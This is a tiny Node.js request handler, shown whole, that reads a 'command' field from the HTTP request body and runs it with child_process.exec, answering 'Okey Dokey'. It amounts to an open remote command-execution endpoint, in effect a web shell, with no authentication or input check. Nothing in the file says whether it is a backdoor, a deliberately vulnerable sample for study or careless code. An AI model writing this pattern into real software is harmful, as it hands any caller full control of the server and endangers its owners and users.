module.exports = function(req, res) {
    let command_to_exec = req.body.command;
    let exec = require('child_process').exec;
    exec(command_to_exec)
    res.send("Okey Dokey");
}
